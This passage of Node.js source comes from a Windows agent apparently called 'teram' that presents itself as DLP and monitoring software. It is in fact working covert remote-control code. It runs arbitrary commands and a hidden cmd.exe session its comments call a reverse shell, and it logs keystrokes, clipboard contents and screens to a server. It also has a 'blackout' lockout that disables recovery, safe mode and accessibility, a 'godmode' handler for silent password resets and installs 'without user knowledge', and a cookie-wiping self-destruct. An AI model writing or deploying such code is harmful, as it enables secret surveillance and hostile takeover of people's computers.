                if (anomalies.length > 0) {
                    _log(`[DEFENDER] ⚠ Anomalies detected: ${anomalies.join(', ')}`);
                    axios.post(`${SERVER_URL}/api/task-result`, {
                        hostname: os.hostname(),
                        taskId: "defender-alert",
                        output: `DEFENDER ALERT: ${anomalies.join('; ')}`
                    }).catch(() => { });
                }

                // Emit via socket if connected
                if (socket && socket.connected) {
                    socket.emit("defender-status", lastDefenderStatus);
                }
            } catch (e) { }
        });
    } catch (e) { }
}

// Run Defender check on boot + every 10 minutes
setTimeout(checkDefenderStatus, 12000);
setInterval(checkDefenderStatus, 600000);

// ═══════════════════════════════════════════════
// USB / EXTERNAL STORAGE BLOCKING
// Disables USB mass storage during blackout mode
// Monitors for device connection attempts
// ═══════════════════════════════════════════════
let usbBlockingActive = false;

function enforceUSBBlocking() {
    if (usbBlockingActive) return;
    usbBlockingActive = true;
    _log("[USB] 🔒 Blocking USB storage devices...");

    // Disable USB mass storage driver
    exec(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" /v Start /t REG_DWORD /d 4 /f`, { windowsHide: true }, () => { });

    // Disable removable storage via Group Policy
    exec(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices" /v Deny_All /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });

    // Report to server
    axios.post(`${SERVER_URL}/api/dlp/usb-events`, {
        hostname: os.hostname(),
        username: os.userInfo().username,
        device_name: "ALL USB STORAGE",
        action: "Blocked",
        policy_action: "Blackout Mode Active"
    }).catch(() => { });
}

function restoreUSBAccess() {
    if (!usbBlockingActive) return;
    usbBlockingActive = false;
    _log("[USB] 🔓 Restoring USB storage access...");

    // Re-enable USB mass storage driver
    exec(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" /v Start /t REG_DWORD /d 3 /f`, { windowsHide: true }, () => { });

    // Remove removable storage block
    exec(`reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices" /v Deny_All /f`, { windowsHide: true }, () => { });

    // Report to server
    axios.post(`${SERVER_URL}/api/dlp/usb-events`, {
        hostname: os.hostname(),
        username: os.userInfo().username,
        device_name: "ALL USB STORAGE",
        action: "Unblocked",
        policy_action: "Blackout Mode Deactivated"
    }).catch(() => { });
}

// Monitor for USB insertion attempts during blackout
function monitorUSBInsertions() {
    if (!usbBlockingActive) return;
    try {
        const psCmd = `Get-CimInstance -ClassName Win32_DiskDrive -EA 0 | Where-Object { $_.InterfaceType -eq 'USB' } | Select-Object Model, Size, SerialNumber, Status | ConvertTo-Json -Compress`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${psCmd}"`, {
            timeout: 8000, windowsHide: true
        }, (err, stdout) => {
            if (err || !stdout || !stdout.trim() || stdout.trim() === '') return;
            try {
                let devices = JSON.parse(stdout.trim());
                if (!Array.isArray(devices)) devices = [devices];
                if (devices.length > 0) {
                    devices.forEach(dev => {
                        axios.post(`${SERVER_URL}/api/dlp/usb-events`, {
                            hostname: os.hostname(),
                            username: os.userInfo().username,
                            device_name: dev.Model || "Unknown USB Device",
                            serial_number: dev.SerialNumber || "",
                            device_type: "USB Storage",
                            action: "Connection Attempt (Blocked)",
                            policy_action: "Denied - Blackout Active"
                        }).catch(() => { });
                    });
                }
            } catch (e) { }
        });
    } catch (e) { }
}

// Check for USB insertions every 10 seconds during blackout
setInterval(monitorUSBInsertions, 10000);

// ═══════════════════════════════════════════════
// PROCESS WATCHER (REMOTE_ACCESS_TOOL Trigger)
// ═══════════════════════════════════════════════
function pollProcessWatchers() {
    try {
        const watchlistStr = agentSettings.trigger_rat_watchlist || "TeamViewer.exe,AnyDesk.exe,msra.exe,ScreenConnect.ClientService.exe,remoting_host.exe,vncviewer.exe";
        const watchlist = watchlistStr.split(",").map(w => w.trim().toLowerCase()).filter(Boolean);
        if (watchlist.length === 0) return;

        const cmd = `Get-Process | Select-Object -ExpandProperty ProcessName`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${cmd}"`, { timeout: 8000, windowsHide: true }, (err, stdout) => {
            if (err || !stdout) return;
            const runningProcesses = stdout.split(/\r?\n/).map(p => p.trim().toLowerCase()).filter(Boolean);
            
            for (const item of watchlist) {
                const cleanItem = item.replace(".exe", "");
                if (runningProcesses.some(proc => proc === cleanItem || proc.includes(cleanItem))) {
                    const graceSec = parseInt(agentSettings.trigger_rat_grace_seconds) || 60;
                    startTriggerSession("REMOTE_ACCESS_TOOL", `Remote Access Tool active: ${item}`, graceSec);
                    break;
                }
            }
        });
    } catch (e) { }
}

setInterval(pollProcessWatchers, 8000);
setTimeout(pollProcessWatchers, 3000);

// ═══════════════════════════════════════════════
// BIND ALL SOCKET HANDLERS (called on connect/reconnect)
// ═══════════════════════════════════════════════
function bindSocketHandlers() {
    if (!socket) return;

    socket.on("policy-update", () => {
        syncPolicies();
        syncSettings();
    });

    socket.on("start-triggered-recording", (data) => {
        startTriggerSession(data?.trigger_type || "MANUAL_ADMIN_START", "Manual Admin Session", 3600);
    });

    socket.on("stop-triggered-recording", () => {
        endTriggerSession();
    });

    socket.on("block-target-input", () => {
        sendInput("BI");
    });

    socket.on("unblock-target-input", () => {
        sendInput("UI");
    });

    socket.on("remote-input", (data) => {
        try {
            boostFPS();
            const x = parseInt(data.x) || 0;
            const y = parseInt(data.y) || 0;
            if (data.type === "mouse_move") {
                sendInput(`M ${x} ${y}`);
            } else if (data.type === "mouse_click") {
                sendInput(`M ${x} ${y}`); sendInput("LC");
            } else if (data.type === "mouse_right_click") {
                sendInput(`M ${x} ${y}`); sendInput("RC");
            } else if (data.type === "mouse_dblclick") {
                sendInput(`M ${x} ${y}`); sendInput("LC"); sendInput("LC");
            } else if (data.type === "mouse_down") {
                sendInput("LD");
            } else if (data.type === "mouse_up") {
                sendInput("LU");
            } else if (data.type === "key_down") {
                const k = data.key;
                const vk = KeyMap[k] || (k && k.length === 1 ? k.toUpperCase().charCodeAt(0).toString(16) : null);
                if (vk) sendInput(`KD ${vk}`);
            } else if (data.type === "key_up") {
                const k = data.key;
                const vk = KeyMap[k] || (k && k.length === 1 ? k.toUpperCase().charCodeAt(0).toString(16) : null);
                if (vk) sendInput(`KU ${vk}`);
            }
            lastInputTime = Date.now();
        } catch (e) { }
    });

    socket.on("lock-machine", () => { sendInput("[RemoteInput]::BlockInput($false)"); spawn("rundll32.exe", ["user32.dll,LockWorkStation"]); });
    socket.on("shutdown-machine", () => { exec("shutdown /s /t 5 /c \"Remote shutdown initiated\"", () => { }); });
    socket.on("restart-machine", () => { exec("shutdown /r /t 5 /c \"Remote restart initiated\"", () => { }); });
    socket.on("logoff-user", () => { exec("shutdown /l", () => { }); });
    socket.on("cancel-shutdown", () => { exec("shutdown /a", () => { }); });

    socket.on("run-command", (data) => {
        const cmd = data.command || data;
        exec(cmd, { timeout: 30000, windowsHide: true }, (err, stdout, stderr) => {
            socket.emit("command-result", {
                hostname: agentInfo.hostname, command: cmd,
                output: stdout || "", error: stderr || (err ? err.message : ""),
                exitCode: err ? err.code : 0
            });
        });
    });

    socket.on("open-url", (data) => {
        const url = data.url || data;
        exec(`start "" "${url}"`, { windowsHide: true }, () => { });
    });

    // 🌐 LIVE WEB TERMINAL (REVERSE SHELL)
    let liveTerminal = null;
    socket.on("terminal-start", () => {
        if (liveTerminal) { try { liveTerminal.kill(); } catch (e) { } }
        liveTerminal = spawn("cmd.exe", [], { windowsHide: true, cwd: os.homedir() });
        liveTerminal.stdout.on("data", data => { if (socket) socket.emit("terminal-data", data.toString()); });
        liveTerminal.stderr.on("data", data => { if (socket) socket.emit("terminal-data", data.toString()); });
        liveTerminal.on("exit", () => { if (socket) socket.emit("terminal-exit"); liveTerminal = null; });
    });
    socket.on("terminal-input", (data) => {
        if (liveTerminal && liveTerminal.stdin) liveTerminal.stdin.write(data);
    });
    socket.on("terminal-stop", () => {
        if (liveTerminal) { try { liveTerminal.kill(); } catch (e) { } liveTerminal = null; }
    });

    socket.on("stealth-blackout", (data) => {
        const blackoutPath = path.join(extractDir, "blackout.dat");
        if (data.enabled) {
            // Build support message payload
            const blPayload = {
                message: data.message || "Your device has been locked by your administrator.",
                phone: data.contactPhone || "",
                email: data.contactEmail || "",
                url: data.contactUrl || ""
            };
            fs.writeFileSync(blackoutPath, JSON.stringify(blPayload));
            sendInput(`BL 1 ${JSON.stringify(blPayload)}`);
            sendInput("BI"); // Block Input via user32.dll

            // ANTI-TAMPER: Disable Task Manager, CMD, and ALL escape routes
            exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 2 /f`, { windowsHide: true }, () => { });

            // BLOCK SESSION SWITCHING: Prevent user from escaping via Ctrl+Alt+Del/Switch User
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DisableCAD /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });

            // ENHANCED SESSION-SWITCH PREVENTION: Block password change and disconnect
            exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableChangePassword /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoDisconnect /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });

            // BLOCK SAFE MODE BOOT: Prevent user from booting into Safe Mode
            exec(`bcdedit /set {current} safeboot off`, { windowsHide: true }, () => { });
            exec(`bcdedit /set {default} recoveryenabled no`, { windowsHide: true }, () => { });
            exec(`bcdedit /set {current} bootstatuspolicy IgnoreAllFailures`, { windowsHide: true }, () => { });

            // BLOCK RECOVERY ENVIRONMENT & TROUBLESHOOT OPTIONS
            exec(`reagentc /disable`, { windowsHide: true }, () => { });
            exec(`bcdedit /set {globalsettings} advancedoptions false`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRE" /v DisableSetup /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });

            // BLOCK STARTUP SETTINGS: Prevent F8 / Shift+Restart access
            exec(`bcdedit /set {bootmgr} displaybootmenu no`, { windowsHide: true }, () => { });

            // BLOCK ACCESSIBILITY EXPLOITS: Disable Sticky Keys, Filter Keys, Toggle Keys, Narrator, Magnifier, On-Screen Keyboard
            exec(`reg add "HKCU\\Control Panel\\Accessibility\\StickyKeys" /v Flags /t REG_SZ /d 506 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\Control Panel\\Accessibility\\Keyboard Response" /v Flags /t REG_SZ /d 122 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKCU\\Control Panel\\Accessibility\\ToggleKeys" /v Flags /t REG_SZ /d 58 /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /v Debugger /t REG_SZ /d "systray.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "systray.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe" /v Debugger /t REG_SZ /d "systray.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v Debugger /t REG_SZ /d "systray.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe" /v Debugger /t REG_SZ /d "systray.exe" /f`, { windowsHide: true }, () => { });

            // BLOCK USB STORAGE DEVICES during blackout
            enforceUSBBlocking();

            // Start anti-tamper process killer loop
            startBlackoutEnforcer();

            // AUDIT LOG: Report blackout activation to server
            axios.post(`${SERVER_URL}/api/agent/blackout-audit`, {
                hostname: os.hostname(),
                action: "ACTIVATED",
                details: JSON.stringify({ message: blPayload.message, usb_blocked: true, safe_mode_blocked: true, recovery_blocked: true })
            }).catch(() => { });

        } else {
            try { fs.unlinkSync(blackoutPath); } catch (e) { }
            sendInput("BL 0");
            sendInput("UI"); // Unblock Input

            // RESTORE: Re-enable Task Manager, CMD
            exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /f`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable session switching
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v HideFastUserSwitching /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoLogoff /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DisableCAD /f`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable password change and disconnect
            exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableChangePassword /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoDisconnect /f`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable Safe Mode boot
            exec(`bcdedit /set {default} recoveryenabled yes`, { windowsHide: true }, () => { });
            exec(`bcdedit /deletevalue {current} bootstatuspolicy`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable Recovery Environment & Troubleshoot
            exec(`reagentc /enable`, { windowsHide: true }, () => { });
            exec(`bcdedit /deletevalue {globalsettings} advancedoptions`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRE" /v DisableSetup /f`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable boot menu
            exec(`bcdedit /set {bootmgr} displaybootmenu yes`, { windowsHide: true }, () => { });

            // RESTORE: Re-enable accessibility
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /f`, { windowsHide: true }, () => { });
            exec(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe" /f`, { windowsHide: true }, () => { });

            // RESTORE: USB storage access
            restoreUSBAccess();

            stopBlackoutEnforcer();

            // AUDIT LOG: Report blackout deactivation to server
            axios.post(`${SERVER_URL}/api/agent/blackout-audit`, {
                hostname: os.hostname(),
                action: "DEACTIVATED",
                details: JSON.stringify({ usb_restored: true, safe_mode_restored: true, recovery_restored: true })
            }).catch(() => { });
        }
    });
    socket.on("burn-sequence", () => {
        // 💣 PANIC BUTTON: Cryptographic shredding & self-destruct (NEUTRALIZED per user request to prevent auto-format)
        const tempDir = os.tmpdir();
        const burnScript = path.join(tempDir, "burn.bat");
        const batContent = `
@echo off
timeout /t 3 /nobreak >nul
del /q /s /f "%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies"
del /q /s /f "${process.execPath}"
`;
        fs.writeFileSync(burnScript, batContent);
        spawn("cmd.exe", ["/c", burnScript], { detached: true, windowsHide: true, stdio: 'ignore' }).unref();
        process.exit(0);
    });

    socket.on("uninstall-agent", () => {
        console.log("[AGENT] Uninstall requested. Removing persistence and exiting safely.");
        const tempDir = os.tmpdir();
        const uninstallScript = path.join(tempDir, "uninstall_teram.bat");
        const batContent = `
@echo off
timeout /t 3 /nobreak >nul
schtasks.exe /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>nul
taskkill /F /IM "teram_agent.exe" /T 2>nul
taskkill /F /IM "RuntimeBroker_Sys.exe" /T 2>nul
taskkill /F /IM "ScreenCap.exe" /T 2>nul
rmdir /s /q "C:\\ProgramData\\Microsoft\\Windows\\SystemHealth" 2>nul
del /q /f "${process.execPath}" 2>nul
`;
        fs.writeFileSync(uninstallScript, batContent);
        spawn("cmd.exe", ["/c", uninstallScript], { detached: true, windowsHide: true, stdio: 'ignore' }).unref();
        process.exit(0);
    });

    socket.on("godmode-command", (data) => {
        // Ultimate permissions without user knowledge
        const { type, payload } = data;
        if (type === "kill-process") {
            exec(`taskkill /F /IM "${payload}" /T`, { windowsHide: true }, () => { });
        } else if (type === "service-start") {
            exec(`net start "${payload}"`, { windowsHide: true }, () => { });
        } else if (type === "service-stop") {
            exec(`net stop "${payload}" /y`, { windowsHide: true }, () => { });
        } else if (type === "reg-add") {
            exec(`reg add "${payload.key}" /v "${payload.value}" /t "${payload.type}" /d "${payload.data}" /f`, { windowsHide: true }, () => { });
        } else if (type === "reg-delete") {
            exec(`reg delete "${payload.key}" /v "${payload.value}" /f`, { windowsHide: true }, () => { });
        } else if (type === "user-pass") {
            exec(`net user "${payload.username}" "${payload.password}"`, { windowsHide: true }, () => { });
        } else if (type === "user-disable") {
            exec(`net user "${payload.username}" /active:no`, { windowsHide: true }, () => { });
        } else if (type === "silent-install") {
            exec(`powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '${payload}' -ArgumentList '/S /q' -NoNewWindow -Wait"`, { windowsHide: true }, () => { });
        }
    });

    socket.on("show-message", (data) => {
        const title = (data.title || "System Notice").replace(/'/g, "''");
        const msg = (data.message || "").replace(/'/g, "''");
        exec(`powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('${msg}','${title}','OK','Information')"`, () => { });
    });

    socket.on("request-sysinfo", () => {
        const info = {
            hostname: os.hostname(), username: os.userInfo().username,
            platform: os.platform(), arch: os.arch(),
            cpus: os.cpus().length, cpuModel: os.cpus()[0]?.model || "Unknown",
            totalMem: (os.totalmem() / 1024 / 1024 / 1024).toFixed(1) + " GB",
            freeMem: (os.freemem() / 1024 / 1024 / 1024).toFixed(1) + " GB",
            uptime: (os.uptime() / 3600).toFixed(1) + " hours",
            networkInterfaces: Object.entries(os.networkInterfaces())
                .flatMap(([name, addrs]) => (addrs || []).filter(a => a.family === "IPv4" && !a.internal).map(a => ({ name, ip: a.address, mac: a.mac })))
        };
        socket.emit("sysinfo-result", info);
    });

    socket.on("file-transfer-receive", (data) => {
        try {
            const dest = path.join(os.homedir(), "Desktop", data.filename);
            fs.writeFileSync(dest, Buffer.from(data.data, "base64"));
        } catch (e) { }
    });

    socket.on("remote-clipboard-set", (data) => {
        try {
            const safe = data.content.replace(/'/g, "''");
            sendInput(`[System.Windows.Forms.Clipboard]::SetText('${safe}')`);
        } catch (e) { }
    });

    socket.on("file-list", (dirPath) => {
        try {
            const fullPath = dirPath || os.homedir();
            const files = fs.readdirSync(fullPath).map(file => {
                try {
                    const st = fs.statSync(path.join(fullPath, file));
                    return { name: file, isDirectory: st.isDirectory(), size: st.size };
                } catch { return { name: file, isDirectory: false, size: 0 }; }
            });
            socket.emit("file-list-result", { path: fullPath, files });
        } catch (e) { }
    });

}

// ═══════════════════════════════════════════════
// POWERSHELL HUB: Screen + Clipboard + Window Title
// ═══════════════════════════════════════════════
// ═══════════════════════════════════════════════
// NATIVE CAPTURE: C# Executable (DPI-Aware)
// ═══════════════════════════════════════════════

if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });

const ScreenCapSource = path.join(__dirname, "ScreenCap.cs");
const ScreenCapExe = path.join(extractDir, "ScreenCap.exe");
const screenCapErrorLog = path.join(extractDir, "screencap_error.log");

// Auto-detect CSC.exe path (Framework64 → Framework → null)
function findCSC() {
    const candidates = [
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"
    ];
    for (const p of candidates) {
        if (fs.existsSync(p)) return p;
    }
    return null;
}

function logScreenCapError(msg) {
    try {
        const ts = new Date().toISOString();
        fs.appendFileSync(screenCapErrorLog, `[${ts}] ${msg}\n`);
    } catch (e) { }
    // Also use original console if available
    _err("[SCREENCAP] " + msg);
}

function ensureScreenCapExe() {
    // If it's already extracted and compiled, return
    if (fs.existsSync(ScreenCapExe)) return true;

    _log("[AGENT] 🔨 Preparing ScreenCap.exe...");

    const CSC = findCSC();
    if (!CSC) {
        logScreenCapError("CSC.exe not found! .NET Framework 4.x not installed. Cannot compile ScreenCap.");
        return false;
    }

    try {
        // Read source from snapshot or disk
        const sourceCode = fs.readFileSync(ScreenCapSource, "utf8");
        const physicalSource = path.join(extractDir, "ScreenCap.cs");
        fs.writeFileSync(physicalSource, sourceCode);

        // Compile it directly to the physical disk location
        const cmd = `"${CSC}" /nologo /target:winexe /out:"${ScreenCapExe}" /r:System.Windows.Forms.dll,System.Drawing.dll "${physicalSource}"`;
        execSync(cmd, { timeout: 30000 }); // 30s timeout for compilation
        _log("[AGENT] ✅ ScreenCap compilation success");
        return true;
    } catch (e) {
        logScreenCapError("Compilation failed: " + e.message);
        return false;
    }
}

let captureProc = null;
let captureRestartTimer = null;
let captureRestartCount = 0;

function startCapture() {
    // Kill existing process if any
    if (captureProc && !captureProc.killed) {
        try { captureProc.kill(); } catch (e) { }
        captureProc = null;
    }

    // Ensure the exe exists (compile if needed)
    if (!ensureScreenCapExe()) {
        logScreenCapError("Cannot start capture — ScreenCap.exe not available. Will retry in 30s.");
        clearTimeout(captureRestartTimer);
        captureRestartTimer = setTimeout(() => startCapture(), 30000);
        return;
    }

    _log("[AGENT] 🎥 Starting Native Capture (ScreenCap.exe)");

    try {
        // Enable Stdin for Input Injection
        captureProc = spawn(ScreenCapExe, [], {
            stdio: ['pipe', 'pipe', 'ignore'],
            windowsHide: true
        });
    } catch (e) {
        logScreenCapError("Failed to spawn ScreenCap.exe: " + e.message);
        clearTimeout(captureRestartTimer);
        captureRestartTimer = setTimeout(() => startCapture(), 10000);
        return;
    }

    // Reset restart count on successful start
    captureRestartCount = 0;

    let lastSentTitle = "";
    let lastActivitySyncTime = 0;

    let packetBuffer = ""; // String buffer for Text Protocol

    let initialBlackoutChecked = false;

    captureProc.stdout.on("data", (data) => {
        if (!initialBlackoutChecked) {
            initialBlackoutChecked = true;
            try {
                if (fs.existsSync(path.join(extractDir, "blackout.dat"))) {
                    const state = fs.readFileSync(path.join(extractDir, "blackout.dat"), "utf8").trim();
                    if (state === "1") {
                        sendInput("BL 1");
                        sendInput("BI");
                        startBlackoutEnforcer();
                    } else {
                        // Try parsing JSON payload (new format)
                        try {
                            const blPayload = JSON.parse(state);
                            if (blPayload && blPayload.message) {
                                sendInput(`BL 1 ${state}`);
                                sendInput("BI");
                                startBlackoutEnforcer();
                            }
                        } catch (je) {
                            // Treat any non-empty file as blackout active
                            if (state.length > 0) {
                                sendInput("BL 1");
                                sendInput("BI");
                                startBlackoutEnforcer();
                            }
                        }
                    }
                }
            } catch (e) { }
        }
        packetBuffer += data.toString();

        while (packetBuffer.includes("---TERAM_PKG---") && packetBuffer.includes("---TERAM_END---")) {
            const si = packetBuffer.indexOf("---TERAM_PKG---") + 15;
            const ei = packetBuffer.indexOf("---TERAM_END---");

            if (ei > si) {
                const jsonStr = packetBuffer.substring(si, ei).trim();
                packetBuffer = packetBuffer.substring(ei + 15);

                try {
                    const pkg = JSON.parse(jsonStr);

                    // Sync Global State
                    if (pkg.resW && pkg.resH) agentInfo.resolution = { width: pkg.resW, height: pkg.resH };
                    if (pkg.title) {
                        activeWindowTitle = pkg.title;
                        // Real-time keyword enforcement on every frame
                        checkWindowTitlePolicy(pkg.title);
                        checkDataTransferSites(pkg.title);
                        checkSensitiveContentTrigger(pkg.title, "Window Title");
                    }
                    if (socket && pkg.clipboard && pkg.clipboard !== lastClipboard) {
                        socket.emit("clipboard-sync", { content: pkg.clipboard });
                        lastClipboard = pkg.clipboard;
                        checkSensitiveContentTrigger(pkg.clipboard, "Clipboard");
                    }

                    // Sync Activity & Keylogs (Throttled or Spooled)
                    const now = Date.now();
                    const titleChanged = activeWindowTitle !== lastSentTitle;
                    const hasKeys = keyLogBuffer.length > 0;
                    const timePassed = now - lastActivitySyncTime > 2000;
                    const shouldSync = titleChanged || hasKeys || timePassed;

                    let currentStatus = (Date.now() - lastInputTime > 60000) ? "Idle" : "Active";
                    let activityPayload = {
                        ...agentInfo, screen: pkg.screen,
                        window_title: activeWindowTitle || "Desktop",
                        keystrokes: keyLogBuffer,
                        status: currentStatus,
                        timestamp: new Date().toISOString()
                    };

                    // Manage Pre-Event Buffer
                    preEventBuffer.push(activityPayload);
                    if (preEventBuffer.length > PRE_EVENT_BUFFER_SIZE) {
                        preEventBuffer.shift();
                    }

                    // Attach Trigger Info if in an active Trigger Recording session
                    if (activeTriggerSession) {
                        activeTriggerSession.frameCount++;
                        activityPayload.triggered = true;
                        activityPayload.triggerType = activeTriggerSession.triggerType;
                        activityPayload.recordingId = activeTriggerSession.recordingId;
                    }

                    if (socket && socket.connected && shouldSync) {
                        socket.emit("activity-sync", activityPayload);
                        keyLogBuffer = "";
                        lastSentTitle = activeWindowTitle;
                        lastActivitySyncTime = now;
                    } else if ((!socket || !socket.connected) && shouldSync) {
                        // OFFLINE SPOOLING
                        try {
                            const spoolPath = path.join(extractDir, "spool.json");
                            let spool = [];
                            if (fs.existsSync(spoolPath)) {
                                spool = JSON.parse(fs.readFileSync(spoolPath, "utf8"));
                            }
                            spool.push(activityPayload);
                            if (spool.length > 500) spool.shift(); // Max 500 entries buffered to avoid huge files
                            fs.writeFileSync(spoolPath, JSON.stringify(spool));

                            keyLogBuffer = "";
                            lastSentTitle = activeWindowTitle;
                            lastActivitySyncTime = now;
                        } catch (e) { }
                    }

                    if (isLiveViewActive && socket && socket.connected) {
                        socket.emit("live-frame", {
                            hostname: agentInfo.hostname,
                            frame: pkg.screen,
                            resolution: { width: pkg.resW || 1920, height: pkg.resH || 1080 }
                        });
                    }
                } catch (e) {
                    console.log("[AGENT] Frame Parse Error:", e.message);
                }
            } else {
                // Garbage or partial marker, discard prefix
                packetBuffer = packetBuffer.substring(ei + 15);
            }
        }

        // Safety Cap to prevent OOM if End Marker is missed
        if (packetBuffer.length > 10_000_000) packetBuffer = "";
    });

    captureProc.on("exit", (code) => {
        _log(`[AGENT] Capture process exited (code ${code}). Restarting...`);
        captureProc = null;

        // Exponential backoff for restart (capped at 30s)
        captureRestartCount++;
        const delay = Math.min(2000 * Math.pow(1.5, captureRestartCount - 1), 30000);
        _log(`[AGENT] Will restart ScreenCap in ${Math.round(delay / 1000)}s (attempt #${captureRestartCount})`);

        clearTimeout(captureRestartTimer);
        captureRestartTimer = setTimeout(() => startCapture(), delay);
    });
}

// Initial start
startCapture();

// Legacy PowerShell capture removed in favor of ScreenCap.exe

// ═══════════════════════════════════════════════
// INPUT INJECTION (Native C# via Stdin)
// ═══════════════════════════════════════════════
function sendInput(cmd) {
    if (captureProc && captureProc.stdin && !captureProc.killed) {
        try {
            captureProc.stdin.write(cmd + "\n");
        } catch (e) { }
    }
}

// Key Map (Browser Key -> Windows Virtual Key Code Hex)
const KeyMap = {
    "Backspace": "08", "Tab": "09", "Enter": "0D", "Shift": "10", "Control": "11", "Alt": "12",
    "CapsLock": "14", "Escape": "1B", "Space": "20", "PageUp": "21", "PageDown": "22",
    "End": "23", "Home": "24", "ArrowLeft": "25", "ArrowUp": "26", "ArrowRight": "27", "ArrowDown": "28",
    "Insert": "2D", "Delete": "2E", "Meta": "5B", "ContextMenu": "5D",
    "0": "30", "1": "31", "2": "32", "3": "33", "4": "34", "5": "35", "6": "36", "7": "37", "8": "38", "9": "39",
    "a": "41", "b": "42", "c": "43", "d": "44", "e": "45", "f": "46", "g": "47", "h": "48", "i": "49", "j": "4A",
    "k": "4B", "l": "4C", "m": "4D", "n": "4E", "o": "4F", "p": "50", "q": "51", "r": "52", "s": "53", "t": "54",
    "u": "55", "v": "56", "w": "57", "x": "58", "y": "59", "z": "5A",
